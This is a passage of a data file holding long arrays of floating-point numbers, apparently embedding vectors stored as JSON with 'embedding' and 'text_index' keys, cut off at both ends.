4,0.009047113864245053,-0.0148002940119724,-0.011786456699920489,0.00024000760657662474,0.003588034941206784,0.031236351026025025,0.04125259844972171,0.03811551871970485,-0.04255224576644298,-0.015506136951226195,0.0005297323249459274,-0.014352139764827136,0.026956477965787734,0.001987283989684788,-0.03831718813092022,0.009685733666427056,-0.04035628995543118,-0.014845109436686928,-0.06023193081632372,0.0030978662333916497,0.0316172821360985,0.03098986619009513,-0.009556889320372791,-0.0010132487431549994,0.011876087549349542,0.016312814596087674,-0.00006674172137661429,-0.027628709336505634,0.05158255384642009,-0.009932218502356953,0.01513640969733135,-0.008318863212633995,0.04696656510082385,0.005178982518572477,-0.048086950718687016,-0.005515098203931427,0.00489328418601737,-0.05212033894299441,-0.012503503495352914,-0.05350961710914473,-0.04559969464703079,-0.021769092555081283,-0.030967458477737863,-0.00977536451585611,0.018228674002633685,-0.0022071596671904337,0.030608935080021653,0.004803653336588318,-0.03907905035106717,-0.008234834291294258,-0.0667749828246446,-0.03934794289935433,-0.06139713185890141,-0.010128285985483007,-0.020323795108037803,0.00780348582841694,0.006862361909411882,-0.0071872737385922,-0.026485916006285207,0.026866847116358682,-0.0568259585380197,-0.033477122261751355,0.0137023161064665,-0.027763155610649213,0.012862026893069128,-0.03903423492635265,-0.009646520169801845,0.015326875252368088,-0.0010657668189923352,0.049252151761264705,-0.01350064669525113,0.011237467747167539,0.008010757167721625,0.001639964448147207,-0.020839172492254858,0.06368271851934226,0.01199932996731449,-0.0037841024243328377,-0.0014971152818696535,0.028525017830796164,0.006890371549858461,0.010486809383199219,-0.01465464388165019,-0.0022211644874137234,0.006257353675765773,0.00023493085924568228,-0.012503503495352914,-0.024043475359343508,0.01957313674406948,0.0510895841745603,0.026351469732141627,-0.0077866800441489924,0.03414935363246925,-0.008346872853080575,-0.029017987502655957,0.05951488402089129,0.0074617682149686745,0.03278248317867619,-0.009332812196800159,-0.0395496123105697,-0.005699961830878849,-0.04344855426073352,0.026665177705143314,0.001364769730759567,0.060276746241038244,0.048086950718687016,0.032020620958529235,-0.007153662170056305,-0.004686012846712685,0.02323679771448203,-0.009091929288959579,-0.01779172361166705,0.03269285232924714,-0.003996975691726839,-0.010453197814663324,0.010408382389948798,-0.019124982496924216,-0.036681425128840005,-0.011399923661757698,0.000722648723521741,0.020883987916969386,0.025791276923210045,-0.005842810997156402,0.025970538622068152,0.015427709957975773,-0.008374882493527153,-0.03383564565946756,-0.026889254828715944,-0.012660357481853757,0.007506583639683201,-0.0038821361658958648,0.0163576300208022,0.004226654743388788,-0.013926393230039134,-0.03773458760963137,-0.0016973842110626941,0.004601983925372948,0.020021290991214746,0.0013346593672794946,0.0020349003784439724,-0.011063807976398748,-0.04396393164495057,0.023684951961627294,0.017287550083628627,-0.01397120865475366,0.03388046108418209,0.028054455871293637,0.02114167660907791,-0.007669039554273361,0.01969637916203443,0.03459750787961452,0.042955584588873726,-0.03842922669270654,-0.017197919234199572,0.011159040753917117,-0.013668704537930605,0.03253599834274629,0.015102798128795456,-0.0057531801477273495,0.03278248317867619,0.03842922669270654,0.003946558338922997,-0.04503950183809921,-0.02384180594812814,0.03524733153797515,0.012391464933566599,-0.007579408704844307,0.008122795729507942,-0.005355443253385926,0.026015354046782676,0.048221396992830595,-0.0014957147998473244,-0.04557728693467353,0.050148460255555236,0.018027004591418316,-0.008901463733922841,0.017186715378020943,0.04212649923165498,-0.006442217302713195,0.03081060449123702,0.056108911742587274,-0.007512185567772518,-0.0008837041560895709,-0.0019088569964343662,-0.049521044309551863,0.0023696155817805927,-0.018318304852062737,0.02774074789829195,0.010212314906822744,-0.03141561272488313,0.014172878065969029,0.05857376010188623,-0.01630161073990904,-0.005579520376958558,-0.014520197607506611,0.008778221315957893,-0.021589830856223177,0.058349682978313604,0.005954849558942718,0.031751728410242076,0.0008059774038503139,0.07058429392537936,0.025007006990705828,-0.025880907772639097,-0.0004730128030416047,-0.0076074183452908865,-0.0036776657906358373,0.019113778640745583,-0.02249734320669234,0.01881127452392253,0.02296790516619487,-0.00930480255635358,-0.009921014646178321,-0.05557112664601296,0.014688255450186085,0.03134838958781134,-0.041050929038506344,0.00964091824171253,0.03813792643206212,-0.03504566212675978,-0.03990813570828591,-0.003361156853589493,-0.015494933095047564,0.02243012006962055,0.005960451487032035,0.043851893083164256,-0.0074617682149686745,0.016884211261197886,-0.0028527818794840823,-0.02964540344865933,-0.006358188381373458,-0.016133552897229567,0.004747634055695159,0.018553585831814004,-0.005938043774674771,0.03318582200110693,-0.001476108051534719,-0.03589715519633579,-0.010626857585432114,0.02079435706754033,-0.010817323140468852,-0.002983026707560675,0.04844547411640323,-0.0035152098760456783,0.0014368945549095083,0.0008017759577833271,0.006240547891497826,0.03748810277370148,0.004781245624231054,0.040087397407144024,-0.04575654863353163,-0.009142346641763421,-0.0012289229745936585,-0.021421773013543702,-0.04562210235938805,0.0012275224925713294,-0.03782421845906043,0.006044480408371772,0.016200776034301357,0.016133552897229567,-0.03004874227109007,0.024021067646986246,-0.006178926682515352,0.0026273042738891206,-0.009327210268710844,0.035336962387404205,-0.052568493190139676,0.03253599834274629,0.002425634862673751,-0.011943310686421332,-0.01787015060491747,0.005131366129813293,0.017466811782486734,0.013142123297534919,-0.010839730852826116,0.007036021680180672,0.00886225023729763,0.03455269245489999,-0.01472186701872198,0.001104980315617546,-0.03986332028357139,-0.007248894947574674,-0.0163576300208022,0.03948238917349791,-0.03755532591077327,-0.021096861184363387,0.0013752733459270342,-0.035157700688546095,-0.030564119655307125,0.002012492666086709,0.02399865993462898,-0.00009033109044021762,-0.01602151433544325,0.03208784409560103,0.009013502295709158,-0.054809264425866,-0.004251863419790709,-0.0029354103188014907,-0.04880399751411944,-0.0052574095118228985,0.049565859734266395,0.024155513921129825,0.006750323347625565,-0.005386253857877163,-0.0003277127932249756,-0.02012212569682243,-0.047056195950252906,-0.007809087756506256,0.05705003566159233,0.037779403034345904,0.006873565765590514,0.04781805817039986,0.015394098389439878,0.015875864205121038,0.00485407068939216,-0.005226598907331662,0.006711109851000355,-0.0016875808369063913,0.0012814410504309944,-0.01323175414696397,-0.015416506101797142,0.010094674416947112,0.07009132425351956,-0.020805560923718963,-0.029891888284589226,0.018116635440847368,-0.008061174520525467,0.04669767255253669,0.005363846145519899,-0.025387938100779304,0.015170021265867245,0.04125259844972171,-0.03170691298552755,0.01756764648809442,0.04140945243622256,0.025992946334425414,0.005120162273634661,0.015315671396189457,0.01465464388165019,0.029107618352085012,0.02201557739101118,-0.00402218436812876,0.009657724025980478,0.006335780669016195,-0.020480649094538644,-0.00301663827609657,-0.0014179880476080675,0.0074617682149686745,0.005576719412913901,0.013993616367110924,-0.06520644295963617,0.0231919822897675,0.013646296825573343,-0.03031763481937723,0.006699905994821723,0.03455269245489999,0.03986332028357139,0.05978377656917845,0.027023701102859524,-0.08165370382986742,0.015013167279366402,0.005803597500531192,0.052254785217137986,-0.002229567379547697,-0.03132598187545407,0.014116858785075872,-0.05377850965743189,-0.017153103809485048,-0.011573583432526489,-0.027315001363503948,0.14905610260051538,-0.00422385377934413,-0.006072490048818351,-0.0042462614917013934,0.04499468641338468,0.041812791258653295,0.0010482607937132233,-0.0036776657906358373,-0.01574141793097746,-0.04477060928981205,-0.009388831477693317,0.017141899953306415,0.00435830005348771,0.04452412445388215,-0.007837097396952835,0.019080167072209688,-0.015371690677082616,-0.012369057221209335,0.07833736240099246,-0.025858500060281835,0.03197580553381471,0.01084533278091543,-0.005086550705098766,0.003870932309717233,0.010117082129304374,0.02554479208728015,-0.02848020240608164,0.03289452174046251,0.0035768310850281524,0.011237467747167539,-0.055660757495442005,0.03466473101668631,-0.0000625840403728252,0.05055179907798598,-0.016178368321944095,-0.004879279365794081,0.03392527650889662,0.0015601369728744565,-0.018127839297026,-0.0007366535437450305,0.02794241730950732,0.025119045552492145,-0.07125652529609726,0.023729767386341822,0.001450899375132798,0.017903762173453366,0.0012891437015538035,0.021993169678653918,-0.010464401670841955,0.06991206255466145,-0.027292593651146686,-0.005164977698349188,0.05633298886615991,0.015394098389439878,0.0019606748312605378,0.016772172699411572,0.046294333730105955,0.020469445238360015,0.022441323925799183,-0.030855419915951546,0.005120162273634661,0.00048316629770348967,-0.004512353075943895,0.0013227552700896985,-0.0005822504007832632,0.020189348833894224,-0.013377404277286183,0.018643216681243056,0.013052492448105866,0.03728643336248611,0.026597954568071524,-0.015999106623085988,0.009808976084392004,-0.01039157660568085,-0.031303574163096815,0.001665173124549128,-0.0057531801477273495,-0.020211756546251486,-0.021634646280937704,0.02541034581313657,0.0006806342628518724,-0.017007453679162836,0.03159487442374124,-0.026261838882712572,0.006940788902662303,-0.008895861805833525,0.0064254115184452475,0.033028968014606086,-0.007271302659931937,-0.01704106524769873,0.013063696304284497,0.05382332508214642,0.010341159252877007,-0.02924206462622859,-0.016324018452266303,-0.0010615653729253484,0.011864883693170911,-0.029264472338585854,0.04434486275502405,-0.05229960064185251,-0.019315448051960955,0.04183519897101056,-0.01738838478923631,0.0011161841717961774,0.005747578219638033,0.008722202035064734,-0.00896868687099463,-0.004019383404084103,0.030720973641807967,-0.007820291612684887,0.007848301253131467,-0.024088290784058036,0.005394656750011137,-0.017970985310525156,0.009433646902407843,-0.01717551152184231,0.028816318091440588,-0.058349682978313604,0.015853456492763776,0.023124759152695712,0.0024592464312096457,0.017074676816234625,0.018923313085708847,0.00529662300844811,-0.002299591480664145,-0.00804436873625752,-0.012615542057139231,-0.007327321940825095,-0.02399865993462898,0.02227326608311971,-0.02283345889205129,-0.06386198021820037,-0.0402218436812876,0.023281613139196557,-0.01513640969733135,0.003966165087235602,0.006346984525194826,-0.05722929736045044,-0.046876934251394796,-0.03025041168230544,0.013982412510932291,0.00954568546419416,-0.030564119655307125,0.008722202035064734,-0.00892947337436942,0.01288443460542639,-0.010346761180966323,-0.0013745731049158699,-0.04102852132614908,-0.0209960264787557,0.03177413612259934,-0.042574653478800246,0.010934963630344484,0.01729875393980726,0.06471347328777638,0.015427709957975773,-0.006027674624103824,-0.044322455042666783,-0.01573021407479883,-0.003529214696268968,-0.0061621208982474045,0.007635427985737465,-0.018015800735239684,-0.014408159045720294,0.04403115478202236,-0.012660357481853757,0.013590277544680184,0.026261838882712572,-0.04893844378826302,-0.025791276923210045,-0.027897601884792792,0.017164307665663677,-0.01826228557116958,-0.00261469993568816,0.004798051408499001,-0.008733405891243367,-0.010738896147218431,-0.01765727733752347,-0.025612015224351938,-0.017545238775737153,-0.0008837041560895709,0.0349112158526162,-0.005206992159019056,-0.04889362836354849,-0.024984599278348566,0.022407712357263288,0.006862361909411882,0.020469445238360015,0.013511850551429762,-0.03435102304368462,0.0009803374156302689,-0.029690218873373857,0.03898941950163812,-0.002837376577238464,-0.0011546974274102239,0.054898895275295054,-0.01955072903171222,0.001305949485821751,0.052254785217137986,0.017702092762237998,0.03267044461688987,-0.013108511728999024,0.015338079108546721,-0.024424406469416984,-0.010049858992232584,0.004072601720932602,-0.0333874914123223,0.022374100788727393,0.009909810789999689,-0.035852339771621264,-0.017668481193702103,0.042955584588873726,-0.011506360295454699,0.009472860399033054,0.021085657328184754,-0.01560697165683388,-0.01315332715371355,-0.014766682443436506,0.02718055508936037,0.011366312093221803,-0.021836315692153073,0.013601481400858815,0.06435494989006016,0.009674529810248425,0.007024817824002041,0.034126945920111985,-0.01120945810672096,0.008122795729507942,0.00838048442161647,-0.07779957730441814,-0.0041622325703616556,-0.03529214696268968,-0.029936703709303753,0.002415831488517448,-0.02700129339050226,0.02774074789829195,0.03374601481003851,-0.03327545285053598,-0.014755478587257875,-0.02718055508936037,0.023886621372842663,0.02610498489621173,-0.027987232734221847,-0.06094897761175614,0.02119769588997107,0.018833682236279792,0.008806230956404473,-0.06601312060449764,0.016794580411768834,-0.013791946955895553,-0.02290068202912308,-0.001004145610009861,0.010677274938235956,0.018721643674493478,-0.021836315692153073,-0.012626745913317862,-0.003926951590610391,-0.002330402085155382,0.0013241557521120274,0.02547756895020836,-0.024177921633487087,0.021455384582079597,-0.03157246671138397,-0.022642993337014552,0.010649265297789378,-0.04571173320881711,-0.026732400842215103,0.005814801356709823,-0.05377850965743189,0.039504796885855176,-0.013545462119965657,-0.08057813363671879,-0.002799563562635582,0.041431860148579816,-0.03092264305302334,-0.003153885514284808,0.0320430286708865,-0.05991822284332203,0.03587474748397852,0.001319254065033876,0.046249518305391424,-0.042821138314730146,-0.011125429185381222,0.0018766459099208003,0.01799339302288242,0.02003249484739338,0.03150524357431218,0.01465464388165019,0.006800740700429408,0.00020236965222653408,0.002450843539075672,-0.0207831532113617,0.03345471454939409,0.01913618635310285,0.033678791672966724,-0.0005752479906716185,-0.05064142992741503,0.0011091817616845328,-0.019875640860892538,-0.002985827671605333,0.013713519962645132,-0.010951769414612431,0.004417120298425526,0.0006365190791485102,0.0025656830649066465,0.021981965822475285,-0.022799847323515397,-0.002425634862673751,-0.011226263890988908,0.01045879974275264,0.016267999171373147,-0.00459918296132829,0.030138373120519122,-0.003985771835548207,-0.002709932713206529,0.00592683991849614,-0.016010310479264617,0.01145034101456154,0.014262508915398082,0.020323795108037803,0.0064086057341773,0.011976922254957228,-0.006257353675765773,-0.02167946170565223,0.027404632212933,0.01519242897822451,0.0010314550094452756,0.02390902908519993,-0.006094897761175614,-0.03482158500318715,0.024177921633487087,0.019315448051960955,-0.02222845065840518,0.026351469732141627,0.021589830856223177,-0.002946614174980122,-0.0013759735869381987,-0.004576775248971027,0.01764607348134484,-0.04506190955045647,-0.013377404277286183,0.05633298886615991,-0.004579576213015684,-0.02003249484739338,0.002988628635649991,0.009484064255211687,-0.05382332508214642,0.019539525175533586,-0.04190242210808235,0.02181390797979581,-0.007730660763255835,0.029421326325086698,-0.02951095717451575,0.016312814596087674,0.04033388224307392,0.016704949562339783,-0.0014270911807532057,-0.0212088997461497,-0.04831102784225965,0.027964825021864582,-0.027763155610649213,0.0008423899364308667,-0.007842699325042151,0.0006564759479666979,0.016940230542091046,-0.0034479867389738883,0.0024382392008747114,0.030228003969948174,-0.026015354046782676,-0.01397120865475366,0.012918046173962285,-0.01969637916203443,0.058663390951315286,0.020872784060790753,-0.00977536451585611,-0.0015629379369191143,-0.021612238568580442,0.01001624742369669,-0.022441323925799183,-0.012895638461605023,-0.016099941328693673,0.013982412510932291,0.005534704952244032,0.032267105794459135,-0.012257018659423018,0.02711333195228858,0.06287604087448079,0.006453421158891827,0.025298307251350252,-0.01301888087956997,-0.02657554685571426,-0.04893844378826302,0.010542828664092377,0.04996919855669713,0.0023766179918922373,-0.03652457114233916,-0.02291188588530171,0.024558852743560563,0.030788196778879756,0.00698560432737683,0.00034364327622896746,-0.006559857792588828,-0.010413984318038113,0.005445074102814979,0.029197249201514064,0.017926169885810632,-0.023416059413340136,0.017410792501593574,-0.011562379576347856,0.0002358061605096379,-0.043291700274232674,0.006761527203804197,-0.005394656750011137,0.000050679943183029075,-0.019449894326104535,-0.02794241730950732,-0.01630161073990904,0.0012779398453751718,-0.000408940750520055,0.05606409631787274,0.010957371342701748,0.046115072031247845,-0.0017183914413976284,0.024850153004204987,0.006459023086981142,0.02814408672072269,0.011259875459524803,-0.021903538829224863,0.015237244402939035,0.03293933716517703,-0.016010310479264617,-0.010979779055059011,-0.027225370514074896,0.0015839451672540487,0.008128397657597257,0.01431852819629124,-0.024289960195273404,-0.027427039925290265,0.022508547062870973,0.033992499645968406,0.01192090297406407,0.034507877030185465,-0.02713573966464584,0.02325920542683929,-0.016133552897229567,0.035673078072763154,0.012436280358281124,0.04831102784225965,0.00579239364435256,0.040804444202576444,0.00038023086906231144,0.017825335180202944,-0.028883541228512378,-0.042910769164159195,-0.02167946170565223,0.03134838958781134,-0.033544345398823144,-0.008638173113724997,0.01142233137411496,0.003680466754680495,0.013926393230039134,-0.0025544792087280146,0.032334328931530924,0.008542940336206629,0.027449447637647527,-0.017914966029632,-0.020682318505754013,0.027830378747721003,0.0019928859177741035,0.002452244021098001,-0.028502610118438902,-0.00889025987774421,-0.004758837911873791,0.019371467332854112,-0.022586974056121395,-0.018564789687992633,0.029466141749801222,0.0028681871817297006,0.005576719412913901,0.0014971152818696535,-0.01573021407479883,0.01025713033153727,-0.004333091377085789,0.025880907772639097,-0.023572913399840977,0.0015503335987181537,0.011685621994312804,0.02397625222227172,0.019237021058710533,0.027471855350004792,-0.036367717155838315,-0.026687585417500576,0.08192259637815458],""text_index"":0},{""embedding"":[-0.042236045508837534,0.009051396989116752,0.06322843373091525,-0.0011735407452766514,0.03209391235257801,0.008246193850021823,-0.011095813469939335,0.01855964682311006,-0.004514277173436462,0.01183248868230278,0.030586297964485375,-0.0037718913005120596,-0.01262055983971484,-0.00776649836290144,-0.01739467206867484,0.019050763631352354,0.011392767819109096,0.008217640547217037,-0.03106599345160576,0.006675762195758664,-0.00763515316999943,0.046644675461896296,0.036000004176272554,-0.0048626274676548354,-0.034697973568374375,-0.0012477793325690915,-0.0026440358397230635,-0.002833915303374882,0.01926776873266872,0.02727411483913035,-0.010033630605601345,0.011118656112183163,0.022545687894658002,0.000780218999140742,0.027137058985667383,-0.02919289678761188,0.00039153716471061024,0.013568529492833692,-0.011347082534621442,-0.024441627200895707,-0.008645940089288809,0.014185280833417042,-0.01885660117227982,0.03501777055978796,0.035063455844275615,-0.0022071703068098575,0.01606979881853283,0.03213959763706566,0.0020786804441883266,0.01597842824955752,0.01073604185459905,0.14180712304968277,0.03394416637432806,-0.015293148982242688,-0.014048224979954074,-0.01956472308183848,0.005199556440751295,0.015098986523170151,-0.012529189270739528,-0.012734773050933979,-0.028210663171127286,-0.007349620141951583,0.003326459776757418,-0.02530964760616116,-0.01906218495247427,-0.008800127924434646,0.0627715808860387,0.016046956176289005,-0.03140863308526318,-0.002422747742985982,-0.0028610409410394274,-0.006481599736686128,0.013351524391517327,0.000810199967085766,0.04109391339664615,0.03764467441782816,0.007081219095586607,-0.007795051665706224,-0.02176903805836786,-0.020432743487103933,-0.03001523190838968,-0.008314721776753306,0.020763961799639435,0.008857234530044215,0.0024327413989676566,0.009274112750994072,0.004637056375497036,-0.024784266834553124,0.03730203478417074,-0.022260154866610156,-0.023173860556363265,0.031180206662824898,0.02524111967942968,0.01582995107497264,0.025994926873475994,-0.03919797409040844,0.022351525435585468,-0.014573605751562113,-0.026177668011426618,0.008274747152826608,-0.003326459776757418,0.0014583599407543787,-0.031225891947312553,0.009496828512871392,-0.0022899748849437335,0.01913071287920575,-0.0008444639304515077,-0.013500001566102208,-0.0027425447343995706,0.038855334456751024,0.002975254152258566,-0.010970178937598283,-0.02482995211904078,0.023002540739534557,0.014505077824830629,-0.006424493131076558,0.008788706603312732,0.009262691429872159,0.02154061163592958,0.030906094955898963,-0.03147716101199466,0.006612944929588137,0.0291243688608804,0.0008637374098447373,0.004157360888376653,-0.0002787516186317107,0.02482995211904078,-0.009251270108750244,-0.012118021710350629,-0.011032996203768809,0.016823606012579147,0.012392133417276562,0.02380203321806853,-0.02594924158898834,-0.028005079390932837,0.009354061998847469,0.02492132268801609,0.0062131986903211514,0.04943147781564328,0.01771446906008843,0.018970814383498957,-0.043789345181417826,-0.012243656242691681,-0.0019930205357739724,-0.044611680302195623,-0.0017460344665125847,0.015784265790484985,0.00603045755237053,0.00015302785721939301,0.028073607317664322,0.052766503583242134,-0.022305840151097812,-0.019781728183154844,-0.017017768471651682,0.006778554085855888,0.03625127324095466,-0.010741752515160005,0.000868020405265455,0.016812184691457233,-0.02727411483913035,-0.04107107075440232,0.08789848735424924,-0.002411326421864068,-0.012586295876349098,-0.02645177971835255,0.022579951858023743,-0.020752540478517524,0.0011528396007431825,-0.011055838846012637,0.013842641199759625,0.010164975798503355,-0.028347719024590254,0.021197972002272164,0.02029568763364097,0.001523318704635264,-0.010713199212355222,-0.02236294675670738,0.01547589012019331,-0.0006991990024321654,0.06930457656777343,-0.018639596070963455,0.02215736297651293,-0.004362944668571103,-0.039769040146504134,-0.022694165069242885,0.0640964541361807,-0.02359644943787408,-0.028027922033176667,-0.010427666184307374,-0.012597717197471011,-0.0018488263566098096,0.0026554571608449775,-0.06103554007550779,0.021255078607881735,0.02315101791411944,-0.015338834266730344,0.04623350790150739,0.01950761647622891,0.007983503464217803,0.003212246565538279,-0.03631980116768614,-0.003277919161989284,0.009748097577553499,-0.021426398424710443,0.006818528709782588,-0.0028267769776736855,-0.0015404506863181348,0.004151650227815696,-0.026063454800207476,-0.010878808368622973,-0.011204316020597517,0.014573605751562113,0.011901016609034264,0.016846448654822977,-0.009245559448189286,0.057974626014834864,0.005476523477957706,0.03689086722378184,-0.02348223622665494,0.012883250225518858,0.027639597115031594,0.0010464785477953594,0.026634520856303173,-0.013180204574688619,-0.038969547667970166,-0.022522845252414176,-0.013203047216932447,-0.003866117199767849,-0.005442259514591965,-0.031819800645652076,0.002468433027473638,-0.0019159266182010536,0.023527921511142597,0.0017674494436161732,0.011615483580986418,-0.011992387178009576,0.016263961277605366,0.0028253493125334466,0.012129443031472542,0.018696702676573026,0.03357868409842681,-0.01235786945391082,-0.0009051396989116751,-0.03054061267999772,0.01809137265711159,-0.031134521378337242,-0.021609139562661063,-0.0378502581980226,-0.017371829426431014,0.0030637693909533986,-0.005268084367482778,0.010079315890089001,-0.004011739044072251,-0.01651523034228747,-0.00378902328219493,-0.027228429554642695,0.010244925046356752,0.0012913231193463883,-0.02212309901314719,0.015464468799071396,0.023082489987387954,-0.034560917714911404,0.06606092136914989,-0.006481599736686128,-0.0006356679036915194,-0.024670053623333986,0.010027919945040388,0.008309011116192349,-0.07962945086198359,-0.010444798165990244,0.00199730353119469,0.04207614701313074,0.011147209414987948,0.009656727008578187,0.022568530536901832,-0.031111678736093412,0.029170054145368055,-0.00003473241598988264,-0.0028638962713199057,-0.008914341135653784,-0.0419619338019116,0.013557108171711777,-0.013351524391517327,-0.021049494827687285,-0.021963200517440395,0.0390837608791893,0.028210663171127286,-0.02212309901314719,0.005633566643384022,0.017326144141943358,0.004568528448765553,0.00030212963530312813,-0.0070869297561475635,0.001090022334572656,0.019496195155106998,0.023230967161972836,-0.009114214255287278,0.01879949456667025,0.00640165048883273,0.005279505688604692,0.005550762065250146,0.017280458857455702,-0.005142449835141725,0.008149112620485555,0.022739850353730537,-0.03305330332681877,-0.01220939227932594,-0.01582995107497264,0.06619797722261286,-0.023013962060656472,0.011341371874060485,-0.022991119418412642,-0.007001269847733209,-0.0005464388324265672,-0.034675130926130546,-0.005939086983395218,-0.04536548749624194,-0.00481694218316718,0.019781728183154844,0.021460662388076184,-0.003774746630792538,0.013294417785907758,0.012392133417276562,0.015909900322826038,0.015315991624486516,0.011067260167134552,-0.04486294936687773,-0.009508249833993307,0.003429251666854643,-0.022020307123049965,-0.02725127219688652,0.006989848526611295,-0.021152286717784508,0.022408632041195035,0.0246015256966025,-0.015852793717216467,-0.018970814383498957,-0.011855331324546609,0.009548224457920005,0.03618274531422318,0.011158630736109862,0.024167515493969772,0.002713991431594786,-0.02960406434800078,0.006607234269027181,0.003197969914135887,0.0205697993405669,0.034149750154522505,-0.016755078085847665,0.015544418046924793,-0.003246510528904021,0.042304573435569016,0.013579950813955605,0.0270685310589359,0.03284771954662433,-0.02027284499139714,-0.04810660456550127,0.0392436593748961,0.0007174017329702157,-0.026931475205472934,-0.004148794897535218,0.031842643287895905,-0.026611678214059343,-0.00481694218316718,-0.031728430076676764,0.027228429554642695,0.009456853888944693,0.0010236359055515317,-0.0657411243777363,-0.012883250225518858,-0.009702412293065843,-0.026520307645084035,0.03481218677959351,0.00946256454950565,-0.02992386133941437,0.021129444075540682,-0.012837564941031204,-0.008177665923290339,0.023413708299923456,-0.0007438135380646415,0.03531472490895772,0.03298477540008729,0.01597842824955752,-0.014036803658832161,-0.02380203321806853,-0.02919289678761188,0.048928939686279066,-0.019164976842571492,-0.002154346696621006,0.01515609312877972,-0.03042639946877858,0.015932742965069864,-0.010204950422430054,0.020250002349153313,0.031774115361164416,0.006276015956491678,0.005927665662273304,0.006441625112759429,-0.009702412293065843,-0.01795431680364862,0.015498732762437137,-0.0010400540546642828,-0.029695434916976092,0.0054822341385186634,-0.01570431654263159,0.0040888329616451695,-0.0352918822667139,0.026177668011426618,-0.08753300507834799,-0.019290611374912545,0.0011114373116762446,-0.0006884915138803711,0.024989850614747573,-0.004976840678873974,0.02036421556037245,-0.019473352512863168,-0.020147210459056087,-0.05075635106578529,-0.022328682793341638,0.03828426840065533,0.015110407844292066,-0.00033889201266428843,0.009588199081846703,-0.009485407191749479,-0.06167513405833496,0.0015761423148241158,0.007538071940463162,-0.008674493392093594,-0.031157364020581068,0.013225889859176275,0.002335660169431389,0.00011117942279613044,0.011210026681158475,0.01060469666169704,-0.010142133156259527,0.015384519551218,-0.0050168153028006725,0.04436041123751352,0.019644672329691876,-0.021026652185443456,0.010953046955915412,-0.014607869714927854,0.007155457682879047,-0.027799495610738387,-0.02489848004577226,0.060395946092680605,-0.012883250225518858,0.01764594113335695,0.0007338198820829669,0.0024555840412114846,-0.2982335371354153,0.020192895743543743,0.0020972400910114364,0.009068528970799622,-0.026703048783034655,0.01215228567371637,0.003552030868915217,-0.02195177919631848,0.0025640865918696663,0.020752540478517524,0.004314404053802969,0.04883756911730376,0.010022209284479432,0.0202385810280314,0.010102158532332829,-0.03003807455063351,0.013077412684591394,0.04059137526728194,0.03332741503374471,-0.02292259149168116,0.0007106203235540793,0.001396256507153972,0.008177665923290339,-0.019119291558083836,-0.00826903649226565,-0.030403556826534752,-0.026931475205472934,-0.0578375701613719,-0.0030837567029167482,-0.01821700718945264,0.01627538259872728,-0.014059646301075989,-0.02366497736460556,-0.009965102678869861,-0.04152792359927887,-0.00531948031253139,-0.01573858050599733,0.023265231125338577,0.023265231125338577,0.031796958003408246,0.023779190575824703,0.007201142967366702,-0.006150381424150625,-0.031842643287895905,0.005465102156835792,0.027730967684006905,0.0039060918236945475,0.006858503333709286,-0.020044418568958864,0.028416246951321736,0.011341371874060485,0.009371193980530339,-0.006510153039490913,0.015327412945608429,-0.013796955915271969,-0.0025883568992537335,0.025195434394942023,0.005719226551798376,0.06761422104173018,0.045616756560924045,0.0004350809514879069,-0.006019036231248616,0.03104315080936193,0.010404823542063546,0.012986042115616084,-0.0392436593748961,0.00517100313794651,-0.008023478088144503,0.04392640103488079,-0.046119294690288255,0.03787310084026643,0.02718274427015504,-0.014048224979954074,0.04810660456550127,-0.0057706224968469885,-0.03958629900855351,0.012426397380642303,0.014516499145952544,-0.01748604263765015,0.004274429429876271,-0.012997463436737997,-0.022225890903244415,0.008463198951338187,0.00798921412477876,0.018696702676573026,-0.005819163111615123,-0.005567894046933018,-0.02200888580192805,-0.004260152778473878,0.01521319973438929,0.03207106971033418,-0.020398479523738192,0.004822652843728136,-0.004728426944472347,-0.021894672590708913,-0.019484773833985083,-0.0011278554607889958,-0.0033664344006841167,-0.0295355364212693,0.011335661213499527,-0.021106601433296852,-0.003946066447621246,-0.033121831253550255,0.018753809282182593,-0.0037233506857439255,0.007338198820829669,0.004014594374352729,0.0018987946365181829,0.007657995812243258,0.025560916670843266,-0.015510154083559052,0.0202385810280314,0.010107869192893785,-0.034035536943303364,-0.0032379445380625854,-0.014219544796782783,-0.008668782731532636,-0.0772538160686255,0.021346449176857046,0.00233280483915091,-0.03574873511159045,-0.0023342325042911495,0.0011271416282188761,-0.04109391339664615,0.010319163633649191,-0.00008815832240977278,0.025583759313087095,0.04783249285857533,-0.012163706994838284,0.01971320025642336,-0.03526903962447007,0.02070685519402987,0.03339594296047619,-0.04543401542297342,0.0017331854802504316,-0.02074111915739561,0.045479700707461074,-0.014847717458488046,0.018399748327403265,0.04760406643613706,0.010981600258720197,-0.019027920989108528,-0.0037005080435000975,0.0024013327658823935,0.01650380902116556,-0.023916246429287667,-0.0038889598420116765,-0.008668782731532636,0.062223357472186824,-0.008548858859752541,-0.018022844730380107,-0.0038746831906092843,-0.020467007450469674,-0.0013655617066388286,0.01882233720891408,-0.03360152674067064,0.0072182749490495735,0.010216371743551967,-0.0040888329616451695,0.019701778935301447,0.012540610591861442,0.0023813454539190443,0.008668782731532636,0.013876905163125366,0.03287056218886815,0.018434012290769006,0.013991118374344505,0.013762691951906228,-0.008074874033193114,-0.028073607317664322,0.01989594139437398,0.03191117121462739,0.025263962321673505,0.0003615561967655863,-0.04579949769887467,0.013397209676004983,0.01580710843272881,0.011295686589572829,-0.014607869714927854,-0.020181474422421828,-0.008154823281046511,0.0291243688608804,-0.01338578835488307,0.0032807744922697625,0.034195435439010165,-0.012734773050933979,-0.035977161534028725,0.00420019084258383,-0.019918784036617808,0.013911169126491109,-0.030586297964485375,-0.007035533811098951,0.0012627698165416036,-0.001663229888378709,0.006727158140807276,-0.014996194633072927,0.0001914855869345874,-0.0065329956817347405,0.011923859251278092,-0.013111676647957137,-0.006498731718368999,0.01256345323410527,-0.013340103070395414,-0.02150634767256384,0.017931474161404795,-0.0009265546760152636,-0.028758886584979153,0.008149112620485555,0.0061903560480773235,0.0025883568992537335,-0.01838832700628135,-0.008012056767022588,-0.01485913877960996,-0.01491624538521953,-0.029261424714343363,0.03250507991296691,0.02050127141383542,0.0070298231505379945,-0.0024070434264433505,0.041345182461328255,-0.012540610591861442,0.031020308167118104,-0.006841371352026415,0.020489850092713504,0.0133286817492735,-0.004991117330276366,-0.016492387700043645,-0.0026054888809366045,0.023048226024022213,0.02727411483913035,0.028553302804784703,-0.026428937076108723,-0.012197970958204025,0.024373099274164225,-0.017634519812235034,0.022534266573536087,0.011227158662841345,-0.004191624851742394,-0.02489848004577226,-0.045616756560924045,0.022579951858023743,-0.03360152674067064,0.03287056218886815,0.002075825113907848,0.07455838428385382,-0.019930205357739723,0.00784073695019388,-0.015875636359460297,0.013751270630784313,0.0050539